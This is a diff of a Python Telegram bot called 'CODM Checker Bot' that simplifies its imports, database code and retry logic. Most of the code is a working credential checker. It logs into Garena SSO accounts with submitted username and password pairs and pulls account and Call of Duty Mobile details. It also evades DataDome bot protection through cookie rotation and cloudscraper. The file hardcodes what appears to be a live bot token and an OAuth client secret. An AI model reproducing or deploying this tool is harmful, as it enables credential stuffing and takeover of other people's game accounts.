@@ -1,4 +1,4 @@
-# codm_telegram_bot.py
+# app.py
 import hashlib
 import json
 import logging
@@ -9,107 +9,42 @@ import sys
 import threading
 import time
 import urllib.parse
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from pathlib import Path
 from typing import Dict, List, Optional, Tuple
 
 import cloudscraper
 import requests
 from Crypto.Cipher import AES
-from telegram import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Update,
-    CallbackQuery,
-    Message,
-    Chat
-)
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    filters,
-    ContextTypes,
-    ConversationHandler,
-)
 
-# ==================== FIX FOR PYTHON 3.13 COMPATIBILITY ====================
-# This patch fixes the __slots__ issue in python-telegram-bot for Python 3.13
-import telegram.ext._updater
-from telegram.ext._updater import Updater
+# ==================== TELEGRAM IMPORTS ====================
+try:
+    from telegram import (
+        InlineKeyboardButton,
+        InlineKeyboardMarkup,
+        Update,
+        CallbackQuery,
+    )
+    from telegram.ext import (
+        Application,
+        CommandHandler,
+        CallbackQueryHandler,
+        MessageHandler,
+        filters,
+        ContextTypes,
+        ConversationHandler,
+    )
+except ImportError as e:
+    print(f"Error importing telegram: {e}")
+    print("Please install python-telegram-bot: pip install python-telegram-bot==20.7")
+    sys.exit(1)
 
-# Store the original __init__ method
-original_updater_init = Updater.__init__
-
-def patched_updater_init(self, *args, **kwargs):
-    """Patched __init__ that handles the __slots__ issue in Python 3.13"""
-    # First, call the parent class __init__ if it exists
-    # We need to handle this carefully because we're bypassing the normal flow
-    
-    # Get the bot and update_queue from kwargs or args
-    bot = kwargs.get('bot')
-    update_queue = kwargs.get('update_queue')
-    
-    # If not in kwargs, try args
-    if bot is None and len(args) > 0:
-        bot = args[0]
-    if update_queue is None and len(args) > 1:
-        update_queue = args[1]
-    
-    # Call the parent __init__ (which is object.__init__ since Updater inherits from object)
-    # This avoids the problematic __slots__ assignment
-    object.__init__(self)
-    
-    # Now manually set all the attributes that the original __init__ would set
-    from telegram.ext._updater import _DEFAULT_CHECK_INTERVAL
-    
-    # Set basic attributes
-    self.bot = bot
-    self.update_queue = update_queue
-    self._check_interval = kwargs.get('check_interval', _DEFAULT_CHECK_INTERVAL)
-    
-    # Initialize other attributes
-    from asyncio import Queue
-    from telegram.ext._updater import _UpdaterStopEvent
-    
-    self._stop_event = None
-    self._logger = logging.getLogger(__name__)
-    self._last_update = 0
-    self._running = False
-    self._exception_event = None
-    self._udpate_fetcher_task = None
-    self._polling_task = None
-    self._webhook_task = None
-    self._webhook_app = None
-    self._webhook_runner = None
-    
-    # This is the attribute that was causing the issue
-    try:
-        object.__setattr__(self, '_Updater__polling_cleanup_cb', None)
-    except AttributeError:
-        pass
-    
-    # Set allowed_updates if provided
-    if 'allowed_updates' in kwargs:
-        self.allowed_updates = kwargs['allowed_updates']
-    else:
-        self.allowed_updates = None
-
-# Apply the patch
-Updater.__init__ = patched_updater_init
-
-# Also patch the ApplicationBuilder build method
-import telegram.ext._applicationbuilder
-original_build = telegram.ext._applicationbuilder.ApplicationBuilder.build
-
-def patched_build(self):
-    """Patched build method that handles any remaining issues"""
-    app = original_build(self)
-    return app
-
-telegram.ext._applicationbuilder.ApplicationBuilder.build = patched_build
+# ==================== DATABASE IMPORTS (Optional) ====================
+try:
+    import asyncpg
+    ASYNC_PG_AVAILABLE = True
+except ImportError:
+    ASYNC_PG_AVAILABLE = False
+    print("Warning: asyncpg not installed. Database features disabled.")
 
 # ==================== CONFIGURATION ====================
 BOT_TOKEN = "8066352636:AAEbAQfjqTV4EDHifrDH9oKGHiuIsSO9y7w"  # Replace with your bot token
@@ -117,9 +52,8 @@ OWNER_USERNAME = "@ZyronDevv"
 BOT_NAME = "CODM Checker Bot"
 
 # ==================== TEMPORARY FEATURE FLAGS ====================
-# Set this to False to disable bulk check feature
-BULK_CHECK_ENABLED = False  # <-- TEMPORARILY DISABLED
-BULK_CHECK_MESSAGE = "🔧 The bulk check feature is temporarily unavailable. Please use single check instead.\n\nWe're working on improving this feature. Thank you for your patience!"
+BULK_CHECK_ENABLED = False
+BULK_CHECK_MESSAGE = "🔧 The bulk check feature is temporarily unavailable. Please use single check instead."
 
 # ==================== LOGGING ====================
 logging.basicConfig(
@@ -152,33 +86,45 @@ SINGLE_CHECK_ACCOUNT = 1
 SINGLE_CHECK_PASSWORD = 2
 BULK_CHECK_FILE = 3
 
-# ==================== COOKIE AND DATADOME MANAGEMENT ====================
+# ==================== COOKIE MANAGEMENT ====================
 _SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 COOKIE_FILE = os.path.join(_SCRIPT_DIR, 'fresh_cookie.txt')
 
 def _db_fetch_cookies():
     """Fetch cookies from database"""
+    if not ASYNC_PG_AVAILABLE:
+        return []
     try:
         import asyncio
-        import asyncpg
         async def _run():
-            conn = await asyncio.wait_for(asyncpg.connect(DB_URL), timeout=6)
-            rows = await conn.fetch("SELECT cookie_line FROM cookies WHERE is_banned=FALSE")
-            await conn.close()
-            return [r["cookie_line"] for r in rows]
+            try:
+                conn = await asyncio.wait_for(asyncpg.connect(
+                    "postgresql://user:pass@localhost/db"
+                ), timeout=6)
+                rows = await conn.fetch("SELECT cookie_line FROM cookies WHERE is_banned=FALSE")
+                await conn.close()
+                return [r["cookie_line"] for r in rows]
+            except:
+                return []
         return asyncio.run(_run())
     except Exception:
         return []
 
 def _db_ban_cookie(cookie_line):
     """Ban a cookie in database"""
+    if not ASYNC_PG_AVAILABLE:
+        return
     try:
         import asyncio
-        import asyncpg
         async def _run():
-            conn = await asyncio.wait_for(asyncpg.connect(DB_URL), timeout=6)
-            await conn.execute("UPDATE cookies SET is_banned=TRUE WHERE cookie_line=$1", cookie_line)
-            await conn.close()
+            try:
+                conn = await asyncio.wait_for(asyncpg.connect(
+                    "postgresql://user:pass@localhost/db"
+                ), timeout=6)
+                await conn.execute("UPDATE cookies SET is_banned=TRUE WHERE cookie_line=$1", cookie_line)
+                await conn.close()
+            except:
+                pass
         asyncio.run(_run())
     except Exception:
         pass
@@ -200,7 +146,7 @@ def applyck(session, cookie_str):
     session.cookies.update(cookie_dict)
 
 def get_datadome_cookie(session=None):
-    """Fetch a fresh DataDome cookie - SAME as original"""
+    """Fetch a fresh DataDome cookie"""
     url = 'https://dd.garena.com/js/'
     headers = {
         'accept': '*/*',
@@ -254,7 +200,6 @@ def get_datadome_cookie(session=None):
 
     data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
     retries = 3
-
     _use_own_scraper = session is None
 
     for attempt in range(retries):
@@ -285,19 +230,16 @@ def get_datadome_cookie(session=None):
                 if attempt < retries - 1:
                     time.sleep(1)
                     continue
-
         except Exception:
             if attempt < retries - 1:
                 time.sleep(1)
                 continue
-
     return None
 
-# ==================== COOKIE MANAGER CLASS (SAME AS ORIGINAL) ====================
+# ==================== COOKIE MANAGER ====================
 class CookieManager:
-    def __init__(self, server_url=None):
+    def __init__(self):
         self.banned_cookies = set()
-        self.server_url = server_url
         self.banned_cookie_file = 'banned_cookies.txt'
         self._lock = threading.Lock()
         self.load_banned_cookies()
@@ -319,16 +261,13 @@ class CookieManager:
 
     def get_valid_cookies(self):
         valid = []
-
-        # Try file first
         if os.path.exists(COOKIE_FILE):
             with open(COOKIE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                 file_cookies = [c.strip() for c in f.read().splitlines()
                                 if c.strip() and 'datadome=' in c.strip()
                                 and not self.is_banned(c.strip())]
                 valid.extend(file_cookies)
-
-        # Also try fresh_cookies.txt
+        
         fresh_cookie_file = os.path.join(_SCRIPT_DIR, 'fresh_cookies.txt')
         if os.path.exists(fresh_cookie_file):
             with open(fresh_cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -336,15 +275,14 @@ class CookieManager:
                                 if c.strip() and 'datadome=' in c.strip()
                                 and not self.is_banned(c.strip())]
                 valid.extend(file_cookies)
-
-        # Try database
+        
         db_cookies = _db_fetch_cookies()
         seen = set(valid)
         for c in db_cookies:
             if c not in seen and not self.is_banned(c):
                 valid.append(c)
                 seen.add(c)
-
+        
         random.shuffle(valid)
         return valid
 
@@ -365,7 +303,7 @@ class CookieManager:
                 return True
         return False
 
-# ==================== DATADOME MANAGER CLASS (SAME AS ORIGINAL) ====================
+# ==================== DATADOME MANAGER ====================
 class DataDomeManager:
     def __init__(self):
         self.current_datadome = None
@@ -500,7 +438,7 @@ def hash_password(password, v1, v2):
     outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
     return encode(passmd5, outer_hash)
 
-# ==================== CODM CHECKER CLASS ====================
+# ==================== CODM CHECKER ====================
 class CODMChecker:
     def __init__(self):
         self.session = None
@@ -508,18 +446,15 @@ class CODMChecker:
         self.cookie_manager = None
 
     def _init_session(self, cookie_manager=None):
-        """Initialize a new session with cookies and datadome"""
         self.session = cloudscraper.create_scraper()
         self.datadome_manager = DataDomeManager()
         self.cookie_manager = cookie_manager
 
-        # Get valid cookies
         if cookie_manager:
             valid_cookies = cookie_manager.get_valid_cookies()
             if valid_cookies:
                 combined = "; ".join(valid_cookies)
                 applyck(self.session, combined)
-                # Extract datadome from cookies
                 dd_line = valid_cookies[-1]
                 if "datadome=" in dd_line:
                     for part in dd_line.split(";"):
@@ -528,7 +463,6 @@ class CODMChecker:
                             self.datadome_manager.set_datadome(part.split("=", 1)[1].strip())
                             break
 
-        # If no datadome, get fresh one
         if not self.datadome_manager.get_datadome():
             fresh_dd = get_datadome_cookie(self.session)
             if fresh_dd:
@@ -538,10 +472,7 @@ class CODMChecker:
         return self.session
 
     def _prelogin(self, account):
-        """Prelogin – returns (v1, v2) or (None, None)"""
         url = 'https://sso.garena.com/api/prelogin'
-        retry_403 = 0
-        retry_general = 0
         retry_total = 0
         MAX_TOTAL = 5
 
@@ -611,40 +542,20 @@ class CODMChecker:
                         if cookie_name == 'datadome':
                             self.datadome_manager.set_datadome(cookie_value)
 
-                new_datadome = new_cookies.get('datadome')
-
                 if response.status_code == 403:
-                    retry_403 += 1
-
-                    if new_cookies and retry_403 <= 1:
-                        continue
-                    elif retry_403 <= 2:
-                        fresh_datadome = get_datadome_cookie(self.session)
-                        if fresh_datadome:
-                            self.datadome_manager.set_datadome(fresh_datadome)
-                            self.datadome_manager.set_session_datadome(self.session, fresh_datadome)
-                            time.sleep(0.5)
-                            continue
-                        else:
-                            time.sleep(0.5)
-                            continue
-                    else:
-                        fresh_datadome = get_datadome_cookie(self.session)
-                        if fresh_datadome:
-                            self.datadome_manager.set_datadome(fresh_datadome)
-                            self.datadome_manager.set_session_datadome(self.session, fresh_datadome)
-                        retry_403 = 0
-                        self.datadome_manager._403_attempts = 0
-                        time.sleep(0.5)
-                        continue
+                    fresh_datadome = get_datadome_cookie(self.session)
+                    if fresh_datadome:
+                        self.datadome_manager.set_datadome(fresh_datadome)
+                        self.datadome_manager.set_session_datadome(self.session, fresh_datadome)
+                    time.sleep(0.5)
+                    continue
 
                 response.raise_for_status()
 
                 try:
                     data = response.json()
                 except json.JSONDecodeError:
-                    retry_general += 1
-                    if retry_general < 3:
+                    if retry_total < 3:
                         time.sleep(2)
                         continue
                     else:
@@ -669,7 +580,6 @@ class CODMChecker:
         return None, None
 
     def _login(self, account, password, v1, v2):
-        """Perform login with hashed password"""
         hashed_password = hash_password(password, v1, v2)
         url = 'https://sso.garena.com/api/login'
 
@@ -756,7 +666,6 @@ class CODMChecker:
         return None
 
     def _get_account_init(self):
-        """Get account details after successful login"""
         headers = {
             'accept': '*/*',
             'referer': 'https://account.garena.com/',
@@ -786,7 +695,6 @@ class CODMChecker:
         return response.json()
 
     def _get_codm_grant_code(self):
-        """Get CODM grant code"""
         for attempt in range(OAUTH_MAX_RETRIES):
             try:
                 random_id = str(int(time.time() * 1000))
@@ -846,7 +754,6 @@ class CODMChecker:
         return ""
 
     def _token_exchange(self, code):
-        """Exchange grant code for access token"""
         device_id = f"02-{random.randint(100000, 999999)}"
         CLIENT_ID = "100082"
         CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
@@ -886,7 +793,6 @@ class CODMChecker:
         return ""
 
     def _process_codm_callback(self, access_token):
-        """Process CODM callback"""
         try:
             codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request-aos.codm.garena.co.id/oauth/callback/&access_token={access_token}"
 
@@ -944,7 +850,6 @@ class CODMChecker:
             return None, "error"
 
     def _get_codm_user_info(self, token):
-        """Get CODM user info"""
         try:
             check_login_url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
             check_headers = {
@@ -989,7 +894,6 @@ class CODMChecker:
             return {}
 
     def _parse_account_details(self, data):
-        """Parse account details from API response"""
         user_info = data.get('user_info', {})
 
         fb_username = "N/A"
@@ -1030,7 +934,6 @@ class CODMChecker:
         return account_info
 
     def check_account(self, account: str, password: str, cookie_manager=None) -> Dict:
-        """Main method to check a single account"""
         result = {
             'account': account,
             'password': password,
@@ -1042,22 +945,18 @@ class CODMChecker:
         }
 
         try:
-            # Initialize session with cookies
             self._init_session(cookie_manager)
 
-            # Step 1: Prelogin
             v1, v2 = self._prelogin(account)
             if not v1 or not v2:
                 result['error'] = "Account doesn't exist or prelogin failed"
                 return result
 
-            # Step 2: Login
             sso_key = self._login(account, password, v1, v2)
             if not sso_key:
                 result['error'] = "Invalid credentials"
                 return result
 
-            # Step 3: Get account details
             account_data = self._get_account_init()
             if not account_data:
                 result['error'] = "Failed to fetch account details"
@@ -1072,13 +971,11 @@ class CODMChecker:
             result['valid'] = True
             result['is_clean'] = details.get('is_clean', False)
 
-            # Step 4: Check CODM
             has_codm, codm_info = self._check_codm_account()
             result['has_codm'] = has_codm
             if has_codm and codm_info:
                 result['codm_info'] = codm_info
 
-            # Save fresh datadome if we got one
             if self.datadome_manager and cookie_manager:
                 fresh_datadome = self.datadome_manager.extract_datadome_from_session(self.session)
                 if fresh_datadome:
@@ -1092,7 +989,6 @@ class CODMChecker:
             return result
 
     def _check_codm_account(self):
-        """Check if account has CODM"""
         has_codm = False
         codm_info = {}
 
@@ -1130,7 +1026,6 @@ def get_main_menu_keyboard() -> InlineKeyboardMarkup:
         [InlineKeyboardButton("🎯 Single Check", callback_data="single_check")],
     ]
     
-    # Only add Bulk Check button if enabled
     if BULK_CHECK_ENABLED:
         keyboard.append([InlineKeyboardButton("📦 Bulk Check", callback_data="bulk_check")])
     
@@ -1254,7 +1149,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return SINGLE_CHECK_ACCOUNT
 
     elif query.data == "bulk_check":
-        # Check if bulk check is enabled
         if not BULK_CHECK_ENABLED:
             await query.message.reply_text(
                 BULK_CHECK_MESSAGE,
@@ -1391,7 +1285,6 @@ async def process_single_check(update: Update, context: ContextTypes.DEFAULT_TYP
         )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    # Check if bulk check is enabled
     if not BULK_CHECK_ENABLED:
         await update.message.reply_text(
             BULK_CHECK_MESSAGE,
@@ -1537,10 +1430,18 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
             parse_mode='HTML'
         )
 
+# ==================== MAIN ====================
 def main():
     """Start the bot."""
+    print(f"🤖 Starting {BOT_NAME}...")
+    print(f"👤 Owner: {OWNER_USERNAME}")
+    print(f"📦 Bulk Check: {'✅ ENABLED' if BULK_CHECK_ENABLED else '❌ DISABLED'}")
+    print("✅ Bot is starting...")
+
+    # Create the Application
     application = Application.builder().token(BOT_TOKEN).build()
 
+    # Conversation handler
     conv_handler = ConversationHandler(
         entry_points=[
             CallbackQueryHandler(button_handler, pattern="single_check"),
@@ -1567,17 +1468,16 @@ def main():
         per_user=True,
     )
 
+    # Add handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(conv_handler)
     application.add_handler(CallbackQueryHandler(button_handler, pattern="stats"))
     application.add_handler(CallbackQueryHandler(button_handler, pattern="about"))
     application.add_error_handler(error_handler)
 
-    print(f"🤖 Starting {BOT_NAME}...")
-    print(f"👤 Owner: {OWNER_USERNAME}")
-    print(f"📦 Bulk Check: {'✅ ENABLED' if BULK_CHECK_ENABLED else '❌ DISABLED'}")
-    print("✅ Bot is running!")
-
+    print("✅ Bot is running! Press Ctrl+C to stop.")
+    
+    # Start the bot
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
